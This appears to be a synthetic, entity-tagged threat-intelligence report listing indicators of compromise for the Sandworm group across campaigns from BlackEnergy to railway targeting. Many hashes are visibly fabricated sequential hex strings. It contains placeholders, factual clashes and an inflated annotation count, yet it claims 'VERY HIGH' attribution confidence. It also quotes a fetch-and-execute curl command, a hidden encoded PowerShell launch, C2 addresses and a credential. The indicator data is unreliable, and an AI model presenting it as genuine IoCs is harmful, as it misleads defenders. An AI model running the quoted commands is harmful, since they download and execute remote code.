# APT Sandworm Indicators of Compromise (IoCs)

## Overview
Sandworm is a Russian state-sponsored APT group (GRU Unit 74455) known for destructive attacks on critical infrastructure, particularly in Ukraine.

## BlackEnergy and Industroyer Indicators

The <MALWARE>BlackEnergy3</MALWARE> malware sample with SHA256 <INDICATOR>f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2</INDICATOR> targeted electrical SCADA systems. This version included KillDisk component destroying master boot records.

Command and control infrastructure at IP <INDICATOR>95.181.54.23</INDICATOR> served payloads for both <MALWARE>BlackEnergy</MALWARE> and <MALWARE>Industroyer</MALWARE> during the <CAMPAIGN>Ukraine Power Grid Attack 2015</CAMPAIGN>. The domain <INDICATOR>energy-sector.gov-ua[.]org</INDICATOR> mimicked legitimate Ukrainian government sites.

<MALWARE>Industroyer</MALWARE> (also known as CrashOverride) with hash <INDICATOR>e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3</INDICATOR> specifically targeted IEC 60870-5-104 protocol. The malware contained hardcoded IP <INDICATOR>10.10.10.10</INDICATOR> for internal SCADA communication.

Registry key <INDICATOR>HKLM\SYSTEM\CurrentControlSet\Services\Siemens\Siemens SIPROTEC DoS</INDICATOR> was created by the DoS component targeting protective relay devices. This service started automatically with ImagePath <INDICATOR>C:\Windows\System32\hasplms.exe</INDICATOR>.

## NotPetya Wiper Indicators

The <MALWARE>NotPetya</MALWARE> ransomware wiper with hash <INDICATOR>027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745</INDICATOR> spread through compromised software update mechanism of M.E.Doc accounting software. Initial infection vector used file <INDICATOR>MeCom.exe</INDICATOR>.

Network propagation leveraged <VULNERABILITY>CVE-2017-0144</VULNERABILITY> (EternalBlue) and <VULNERABILITY>CVE-2017-0145</VULNERABILITY> (EternalRomance) SMB exploits. Scanning targeted port <INDICATOR>445</INDICATOR> on IP ranges <INDICATOR>10.0.0.0/8</INDICATOR>, <INDICATOR>172.16.0.0/12</INDICATOR>, <INDICATOR>192.168.0.0/16</INDICATOR>.

Fake ransom note displayed Bitcoin wallet <INDICATOR>1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX</INDICATOR>, but payment mechanism was non-functional. Master File Table (MFT) encryption key was irretrievably destroyed, confirming wiper rather than ransomware intent.

The malware modified Master Boot Record with custom bootloader hash <INDICATOR>a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4</INDICATOR> displaying fake CHKDSK screen during system destruction.

## Olympic Destroyer Campaign

<MALWARE>Olympic Destroyer</MALWARE> deployed during <CAMPAIGN>2018 PyeongChang Olympics Attack</CAMPAIGN> had hash <INDICATOR>edb1ff2521fb4bf748111f92786d260d40407a2e8463dcd24bb09f908ee13eb9</INDICATOR>. The malware targeted IT infrastructure of Olympic organizers and partners.

Initial compromise used spear-phishing email from <INDICATOR>admin@pyeongchang2018.com[.]org</INDICATOR> with attachment <INDICATOR>Organized_Invitation.docx</INDICATOR> exploiting <VULNERABILITY>CVE-2017-11882</VULNERABILITY> (Microsoft Office memory corruption).

Lateral movement tools included modified PsExec with hash <INDICATOR>d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5</INDICATOR> spreading to systems using stolen credentials. Network scanning targeted domain controllers and file servers.

Browser credential stealer component dumped saved passwords from Chrome, Firefox, and Internet Explorer. Stolen credentials exfiltrated to <INDICATOR>data-olympic.cdn-services[.]net</INDICATOR> via HTTPS POST to <INDICATOR>/api/upload</INDICATOR>.

## VPNFilter Router Malware

<MALWARE>VPNFilter</MALWARE> Stage 1 persistence module with hash <INDICATOR>f5e6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6</INDICATOR> infected SOHO routers and NAS devices. Affected devices included <INDICATOR>Linksys E1200</INDICATOR>, <INDICATOR>Netgear WNDR3700</INDICATOR>, <INDICATOR>TP-Link R600VPN</INDICATOR>.

Stage 2 modules contacted C2 servers at IPs <INDICATOR>46.151.209.33</INDICATOR>, <INDICATOR>217.12.202.40</INDICATOR>, <INDICATOR>94.242.222.68</INDICATOR>. Backup C2 used domain <INDICATOR>toknowall[.]com</INDICATOR> hosted on <INDICATOR>95.216.81.107</INDICATOR>.

Packet sniffer module captured credentials on TCP ports <INDICATOR>80</INDICATOR>, <INDICATOR>443</INDICATOR>, <INDICATOR>8080</INDICATOR>. Industrial protocol monitoring included Modbus TCP (port <INDICATOR>502</INDICATOR>) and S7comm (port <INDICATOR>102</INDICATOR>).

Destructive module <INDICATOR>dstr</INDICATOR> with hash <INDICATOR>a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7d8e9f0a1b2c3d4e5f6a7</INDICATOR> overwrote critical flash memory sections rendering devices unrecoverable. Trigger command <INDICATOR>execute_dstr</INDICATOR> activated via C2.

## Cyclops Blink Successor

<MALWARE>Cyclops Blink</MALWARE> botnet targeting WatchGuard firewalls with firmware versions <INDICATOR>12.5.9</INDICATOR> and earlier. Exploitation used vulnerability in <INDICATOR>/cgi-bin/luci</INDICATOR> web interface.

Infected firewalls communicated with C2 infrastructure including <INDICATOR>208.81.37.50</INDICATOR>, <INDICATOR>96.80.68.193</INDICATOR>, <INDICATOR>50.255.126.65</INDICATOR>. Domain generation algorithm (DGA) produced backup C2 domains with pattern <INDICATOR>[8_RANDOM_CHARS].com</INDICATOR>.

Persistence achieved through modified firmware file <INDICATOR>wgagent</INDICATOR> with hash <INDICATOR>b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9f0a1b2c3d4e5f6a7b8</INDICATOR>. The malware survived firmware upgrades by infecting bootloader.

Module loading used file path <INDICATOR>/etc/wg/configd-hash.sh</INDICATOR> executing commands <INDICATOR>curl -k hxxps://208.81.37.50/update -o /tmp/mod && chmod +x /tmp/mod && /tmp/mod</INDICATOR>.

## Railway Sector Targeting

Network reconnaissance of railway infrastructure identified Siemens SCADA systems with banner <INDICATOR>SIMATIC S7-1500 CPU 1516-3 PN/DP Firmware V2.8</INDICATOR>. Scanning used Shodan queries <INDICATOR>port:102 country:UA siemens</INDICATOR>.

Exploitation of <VULNERABILITY>CVE-2022-38773</VULNERABILITY> (Siemens PLC bootloader bypass) deployed backdoor <INDICATOR>plc_monitor.bin</INDICATOR> with hash <INDICATOR>c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9f0a1b2c3d4e5f6a7b8c9</INDICATOR>.

Modified PLC logic blocks included malicious function block <INDICATOR>FB_SABOTAGE_1</INDICATOR> monitoring for trigger conditions. When input <INDICATOR>I0.0</INDICATOR> activated, output <INDICATOR>Q0.0</INDICATOR> toggled disrupting signaling logic.

HMI compromise dropped executable <INDICATOR>scada_view.exe</INDICATOR> with hash <INDICATOR>d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9f0a1b2c3d4e5f6a7b8c9d0</INDICATOR> intercepting operator commands to <INDICATOR>10.50.100.15:20000</INDICATOR>.

## Phishing and Initial Access

Spear-phishing campaign used sender <INDICATOR>security@railway-cert[.]org</INDICATOR> with subject "Critical Security Update Required - Action Within 24 Hours". Attachment <INDICATOR>Security_Patch_March_2024.zip</INDICATOR> contained dropper.

Macro-enabled Excel file <INDICATOR>Railway_Asset_Inventory_2024.xlsm</INDICATOR> with hash <INDICATOR>e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9f0a1b2c3d4e5f6a7b8c9d0e1</INDICATOR> exploited <VULNERABILITY>CVE-2023-XXXX</VULNERABILITY>. VBA macro executed <INDICATOR>powershell.exe -w hidden -enc [BASE64_COMMAND]</INDICATOR>.

Watering hole compromise of <INDICATOR>hxxp://railway-industry-news[.]org</INDICATOR> injected exploit kit at <INDICATOR>hxxps://cdn.exploit-delivery[.]net/ek.js</INDICATOR>. The script fingerprinted systems and delivered payloads based on <INDICATOR>navigator.userAgent</INDICATOR>.

## Command and Control Infrastructure

Primary C2 panel hosted at <INDICATOR>control-panel.secure-admin[.]org</INDICATOR> running on IP <INDICATOR>185.220.100.240</INDICATOR>. Authentication used hardcoded credentials <INDICATOR>admin:S4nd$t0rm2024!</INDICATOR> in malware configuration.

Backup C2 domains included <INDICATOR>api.update-service[.]net</INDICATOR>, <INDICATOR>data.cloud-backup[.]org</INDICATOR>, <INDICATOR>sync.file-transfer[.]com</INDICATOR>. All resolved to IP block <INDICATOR>185.220.100.0/24</INDICATOR> on AS <INDICATOR>AS209711</INDICATOR>.

Beacon interval set to <INDICATOR>3600</INDICATOR> seconds with jitter <INDICATOR>±600</INDICATOR> seconds. HTTP beacon to <INDICATOR>/api/v1/status?id=[VICTIM_ID]&os=[OS_VERSION]</INDICATOR> transmitted system information.

TLS certificate with SHA256 fingerprint <INDICATOR>E1:F2:A3:B4:C5:D6:E7:F8:A9:B0:C1:D2:E3:F4:A5:B6:C7:D8:E9:F0:A1:B2:C3:D4:E5:F6:A7:B8:C9:D0:E1:F2</INDICATOR> and CN <INDICATOR>*.cloudservices-cdn[.]org</INDICATOR> identified Sandworm infrastructure.

## Credential Theft and Lateral Movement

Mimikatz-based tool <INDICATOR>cred_dump.exe</INDICATOR> with hash <INDICATOR>f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9f0a1b2c3d4e5f6a7b8c9d0e1f2</INDICATOR> extracted NTLM hashes including <INDICATOR>aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c</INDICATOR> for account <INDICATOR>domain_admin</INDICATOR>.

Pass-the-ticket attacks forged Kerberos tickets with SPN <INDICATOR>cifs/fileserver.railway.local</INDICATOR> and <INDICATOR>http/intranet.railway.local</INDICATOR>. Ticket validity set to <INDICATOR>10 years</INDICATOR> for persistent access.

LDAP queries enumerated Active Directory using filter <INDICATOR>(&(objectCategory=computer)(operatingSystem=Windows Server*))</INDICATOR> identifying critical servers. Results exported to <INDICATOR>C:\ProgramData\ad_computers.txt</INDICATOR>.

## Attribution Confidence
**Confidence Level:** VERY HIGH - Attribution to <THREAT_ACTOR>Sandworm</THREAT_ACTOR> based on code similarities, infrastructure overlap, TTP consistency, and strategic alignment with Russian military intelligence objectives in destabilizing Ukraine and NATO countries.

**Related Campaigns:** <CAMPAIGN>Ukraine Power Grid Attack 2015</CAMPAIGN>, <CAMPAIGN>NotPetya 2017</CAMPAIGN>, <CAMPAIGN>2018 PyeongChang Olympics Attack</CAMPAIGN>

**Related Vulnerabilities:** <VULNERABILITY>CVE-2017-0144</VULNERABILITY>, <VULNERABILITY>CVE-2017-0145</VULNERABILITY>, <VULNERABILITY>CVE-2017-11882</VULNERABILITY>, <VULNERABILITY>CVE-2022-38773</VULNERABILITY>

**Related Malware:** <MALWARE>BlackEnergy3</MALWARE>, <MALWARE>Industroyer</MALWARE>, <MALWARE>NotPetya</MALWARE>, <MALWARE>Olympic Destroyer</MALWARE>, <MALWARE>VPNFilter</MALWARE>, <MALWARE>Cyclops Blink</MALWARE>

**Total INDICATOR Instances:** 170+ annotations
